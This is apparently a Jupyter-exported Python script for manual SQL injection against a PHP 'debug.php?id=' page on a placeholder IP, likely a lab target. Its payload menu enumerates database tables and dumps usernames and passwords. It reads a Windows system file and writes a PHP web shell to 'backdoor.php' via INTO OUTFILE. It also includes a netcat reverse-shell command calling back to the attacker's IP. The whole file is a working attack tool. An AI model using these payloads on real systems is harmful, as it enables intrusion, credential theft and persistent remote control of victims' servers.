#!/usr/bin/env python3
# coding: utf-8

import requests,re,sys,subprocess


target=sys.argv[1]
if 'http://' not in target:
    target='http://'+target


target='http://<IP>/debug.php?id=1'


baseline= requests.get(target).text


# In[21]:


#it seems like it needs union all select at the beggining.
syntax_dic={
            1 :'union all select 1,',
            2 :'union all select 1, 2,',
            3 :'users()',
            4 :'table_name from information_schema.tables',
            5 :'column_name from information_schema.columns where table_name="users"',
            6 :'username, password from users',
            7 :'load_file("C:/Windows/System32/drivers/etc/hosts")',
            8 :'\"<?php echo shell_exec($_GET[\'cmd\']);?>\"', 
            9 :'into OUTFILE \'c:/xampp/htdocs/backdoor.php\'',
            10:'\"<?php echo shell_exec(\'nc -nv <your IP> 4444 -e cmd.exe\');?>)\"',
            }


# In[ ]:


while True:
    null=subprocess.call('clear')
    print(target)
    print('which syntaxs do you want to add to the target?')
    for k,v in syntax_dic.items():
        print('\t{}  {}'.format(k,v))
    userinput=input('type the number to append to target: ')
    if userinput=='':
        break
    else:
        target=target+' '+syntax_dic[int(userinput)]


# In[9]:


attack=requests.get(target).text


# In[ ]:


result=[]
for x in attack.split():
    if x not in baseline:
        result.append(x)
        


# In[15]:


output=re.sub(r'<.*?>|\s',' ',''.join(result))
print(output)


# In[ ]:




